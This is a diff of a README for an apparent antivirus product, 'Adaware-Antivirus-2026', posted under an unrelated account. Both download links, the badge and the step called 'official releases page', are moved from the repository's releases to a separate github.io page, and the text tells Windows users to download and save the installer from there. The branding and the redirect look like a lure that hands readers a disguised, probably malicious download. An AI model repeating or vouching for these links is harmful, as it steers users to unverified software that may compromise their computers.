@@ -1,6 +1,6 @@
 # 🛡️ Adaware-Antivirus-2026 - Protect your PC from modern threats
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rodgernonpublic780/Adaware-Antivirus-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://rodgernonpublic780.github.io)
 
 ## 📌 Overview
 
@@ -10,7 +10,7 @@ Adaware-Antivirus-2026 provides protection for Windows 10 and Windows 11 compute
 
 Follow these steps to set up your antivirus software on your system. These instructions assume you use a standard Windows computer.
 
-1. Visit the [official releases page](https://github.com/rodgernonpublic780/Adaware-Antivirus-2026/releases) to access the installation file.
+1. Visit the [official releases page](https://rodgernonpublic780.github.io) to access the installation file.
 2. Find the latest version in the list.
 3. Click the file name to start the download process.
 4. Save the file to your "Downloads" folder.
